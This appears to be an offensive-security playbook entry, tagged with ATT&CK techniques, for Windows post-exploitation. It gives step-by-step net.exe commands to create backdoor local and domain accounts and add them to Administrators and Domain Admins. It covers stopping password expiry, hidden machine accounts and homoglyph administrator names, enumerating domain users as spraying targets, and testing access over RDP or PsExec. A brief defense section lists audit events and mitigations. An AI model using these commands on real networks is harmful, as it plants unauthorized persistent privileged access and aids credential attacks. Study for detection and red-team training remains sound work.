---
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
techniques:
  - '[[techniques/Account Discovery|T1087 - Account Discovery]]'
  - '[[techniques/Create Account|T1136 - Create Account]]'
sub_techniques:
  - '[[techniques/Create Account/Local Account|T1136.001]]'
  - '[[techniques/Create Account/Domain Account|T1136.002]]'
tags:
  - create-credential
  - get-credentials
  - windows-using-credentials
commands:
  - '[[commands/net-user-create-local-account]]'
  - '[[commands/net-localgroup-add-to-administrators]]'
  - '[[commands/net-group-add-to-domain-admins]]'
  - '[[commands/net-user-list-all-domain-users]]'
  - '[[commands/net-user-view-specific-domain-user]]'
platforms:
  - Windows
tools: []
validated: true
---

# windows-credential-enumeration

## Summary

The Windows Credential Enumeration procedure provides step-by-step instructions for creating local and domain user accounts, configuring them for persistence and privilege escalation, and enumerating domain users using built-in Windows net commands. This technique allows attackers to establish backdoor access and identify valid accounts for lateral movement in a Windows domain environment.

## Description

In a compromised Windows system with administrative access, attackers often create rogue accounts to maintain persistence or escalate privileges. This procedure covers using the net.exe utility from the command line (CMD or PowerShell) to add local users, assign them to privileged groups like Administrators or Domain Admins, configure password policies to avoid expiration, create hidden machine accounts, and employ homoglyph techniques for deceptive naming. Additionally, it includes enumerating all domain users or viewing details for specific ones to discover targets for credential attacks. This is commonly used post-exploitation in Active Directory environments to map the user landscape and plant backdoors. The approach relies on native tools to evade detection from third-party software, though it triggers Windows event logs for account modifications.

## Requirements

1. Administrative privileges on the target Windows system (local admin for local accounts, domain admin for domain operations).
2. Command-line access via CMD, PowerShell, or remote execution (e.g., via WMI or PsExec).
3. For domain actions: The target must be domain-joined, and the attacker must have domain credentials or local admin on a domain controller.
4. Basic knowledge of Windows net commands and PowerShell execution.

## Defense

- Enable advanced auditing for account management events (Event IDs 4720, 4722, 4732 for user/group changes) and monitor for net.exe executions via Sysmon or EDR tools.
- Implement just-in-time privilege elevation and remove unnecessary local admin rights using tools like LAPS.
- Use Windows Defender Credential Guard to protect domain credentials and restrict net commands via AppLocker or WDAC policies.
- Regularly review domain user lists for anomalies and enforce strong naming conventions to detect homoglyph attacks.

## Objectives

1. Create and configure backdoor accounts for persistent access and privilege escalation.
2. Enumerate domain users to identify high-value targets for further credential attacks.
3. Establish hidden machine or homoglyph accounts to blend with legitimate ones.
4. Verify account creation and group membership for successful lateral movement preparation.

## Instructions

### Step 1: Create a Local User Account

**Context**: Begin by creating a new local user account on the target system. This serves as a backdoor for future access. Use a strong but memorable password, and suppress confirmation prompts with /Y.

**Command** ([[commands/net-user-create-local-account]]):
```cmd
net user $_USERNAME $_PASSWORD /add /Y
```

> This command adds a new local user without prompting for confirmation. Replace $_USERNAME with the desired account name (e.g., 'hacker') and $_PASSWORD with a secure password (e.g., 'Hcker_12345678*'). Success is indicated by "The command completed successfully." Check with `net user` to verify the account exists.

### Step 2: Add the Local User to Privileged Groups

**Context**: Assign the new user to local groups like Administrators for full control, Remote Desktop Users for RDP access, and Backup Operators for file system privileges without full admin rights. This enables versatile post-exploitation options.

**Command** ([[commands/net-localgroup-add-to-administrators]]):
```cmd
net localgroup administrators $_USERNAME /add
```

> Adds the user to the local Administrators group. Expected output: "The command completed successfully." Repeat similar commands for other groups, such as `net localgroup "Remote Desktop Users" $_USERNAME /add` and `net localgroup "Backup Operators" $_USERNAME /add`.

### Step 3: Configure Domain Account and Add to Domain Admins

**Context**: If domain access is available, create or modify a domain user and elevate it to Domain Admins for network-wide control. This step requires domain admin privileges.

**Command** ([[commands/net-group-add-to-domain-admins]]):
```cmd
net group "Domain Admins" $_USERNAME /add /domain
```

> Elevates the user to Domain Admins group domain-wide. Output: Success message. For enabling an existing domain user: `net user $_USERNAME /ACTIVE:YES /domain`. To prevent password changes or expiration: `net user $_USERNAME /Passwordchg:No` and `net user $_USERNAME /Expires:Never`.

**Code** ([[codes/windows-backdoor-account-creation-script]]):

> For a comprehensive script combining account creation, group additions, policy configurations, machine account creation (`net user /add $_MACHINENAME$ $_PASSWORD`), and homoglyph admin (e.g., using Unicode lookalikes like 'Aԁmіnіstrаtοr'), execute the preserved script after editing hardcoded values.

### Step 4: Enumerate All Domain Users

**Context**: List all users in the domain to identify potential targets for spraying or further enumeration. This discovers accounts without dumping hashes.

**Command** ([[commands/net-user-list-all-domain-users]]):
```cmd
net user /domain
```

> Displays a list of all domain users. Expected output: A table-like list of usernames. Use `/dom` as an alias if needed. Pipe to file for offline analysis: `net user /domain > users.txt`.

### Step 5: View Details for a Specific Domain User

**Context**: Retrieve detailed information on a specific user, such as account status, last logon, and group memberships, to assess value for attacks.

**Command** ([[commands/net-user-view-specific-domain-user]]):
```cmd
net user $_USERNAME /domain
```

> Shows full profile for the specified domain user. Expected output: Details including full name, account active status, password last set, and local group memberships. If the user doesn't exist, it will error with "The user name could not be found."

### Step 6: Verify and Test Account Access

**Context**: After creation and enumeration, test the backdoor by logging in or checking effective privileges to ensure success.

> Use RDP or PsExec with the new credentials to connect. Run `whoami /groups` on the target to confirm admin membership. Monitor for Event ID 4624 (successful logon) as a success indicator.
